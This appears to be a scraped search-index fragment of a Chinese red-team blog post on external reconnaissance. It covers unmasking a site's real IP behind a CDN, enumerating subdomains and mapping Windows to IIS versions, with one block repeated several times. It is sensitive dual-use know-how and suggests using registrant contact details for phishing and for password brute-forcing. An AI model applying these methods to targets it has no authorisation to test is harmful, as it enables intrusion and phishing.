全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#6-利用ssl证书寻找真实ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#7-国外解析域名"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#8-漏洞利用"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#9-目标敏感文件泄露"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#10-扫描全网"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 